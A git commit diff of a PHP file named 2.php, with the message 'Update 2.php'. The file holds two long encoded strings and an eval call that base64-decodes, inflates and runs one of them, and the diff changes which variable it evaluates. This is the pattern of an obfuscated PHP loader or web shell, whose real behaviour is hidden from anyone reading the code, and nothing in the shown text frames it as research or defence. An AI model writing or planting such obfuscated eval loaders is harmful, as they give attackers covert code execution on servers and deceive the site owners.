25110a174e5630bbd9f6108e3324b3bc2e5be7f3
Akira <87409484+kxeom@users.noreply.github.com>
2024-08-29 11:58:13 +0700

    Update 2.php

--- 2.php
+++ 2.php
@@ -1,6 +1,6 @@
 <?php
 $Akira = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
 $Kira = "\x3d\x3dwT4l8KTFXkV\x43q\x61q02YjVLs\x4143qtNPnwn/Lt44N3Mg7vz/6K6Sum\x2b/F6iHreGpNIm\x2b4\x61ho/D/893uInof2Yn3\x63\x63L1/uPNtuwKs\x62Vo2/Ms/4Fty4Xe024LLFXWnqWIwl\x624PtKoNT\x42FJ\x43iZ2K5UDDU6xt9\x2bQU9Y3NIvRRJXQ\x63zkd3wF0\x61M\x424rm6I2RSy0HUy\x610wroQVNflUhXno9u\x43ZOWWphk\x42qxNwlkG\x62FZwx///87O88u1U3tXGgk2TrN\x43\x43\x62OkmRwsoJs\x2b0JOJNw\x2bgd\x43OLh\x63UyXGS\x42MDrU0P21/3\x41\x41y\x42wJe/z\x43\x41THw/n\x41\x412\x42wJe/z\x42\x41jHw/X\x41\x416\x42wJe/z\x41\x41zHw/H\x41\x41\x2b\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Akira))));
 exit;
 ?>
